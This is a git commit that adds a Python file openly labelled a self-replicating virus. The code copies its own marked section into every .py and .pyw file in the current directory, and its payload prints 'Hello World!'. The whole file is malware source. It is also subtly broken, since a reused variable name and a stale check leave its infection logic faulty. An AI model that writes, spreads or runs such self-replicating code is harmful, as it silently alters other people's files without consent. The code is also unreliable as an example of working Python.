4dc20e21673c1ee09829b7350c8ee321f7a18a45
Starlight Romero <starlightromero@gmail.com>
2020-11-06 14:27:30 -0800

    initial commit

---
+++ app.py
@@ -0,0 +1,42 @@
+"""Basic Self-Replicating Virus."""
+# START OF VIRUS
+import sys
+import glob
+
+code = []
+with open(sys.argv[0], "r") as f:
+    lines = f.readlines()
+
+virus_area = False
+for line in lines:
+    if line == "# START OF VIRUS\n":
+        virus_area = True
+    if virus_area:
+        code.append(line)
+    if line == "# END OF VIRUS\n":
+        break
+
+python_scrips = glob.glob("*.py") + glob.glob("*.pyw")
+
+for script in python_scrips:
+    with open(script, "r") as f:
+        script_code = f.readlines()
+    infected = False
+    for code in script_code:
+        if line == "# START OF VIRUS\n":
+            infected = True
+            break
+
+    if not infected:
+        final_code = []
+        final_code.extend(code)
+        final_code.extend("\n")
+        final_code.extend(script_code)
+
+        with open(script, "w") as f:
+            f.writelines(final_code)
+
+# Payload
+print("Hello World!")
+
+# END OF VIRUS
